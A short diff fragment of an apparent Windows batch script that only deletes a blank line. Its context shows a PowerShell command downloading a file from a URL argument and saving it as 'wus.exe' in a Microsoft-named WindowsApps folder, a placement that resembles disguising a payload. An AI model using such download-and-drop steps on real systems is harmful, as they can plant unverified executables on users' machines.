@@ -15,5 +15,4 @@ if %errorlevel%==0 (
       powershell -command iwr -Uri %1 -OutFile %localappdata%\Microsoft\WindowsApps\wus.exe
    )
 )
-
 exit
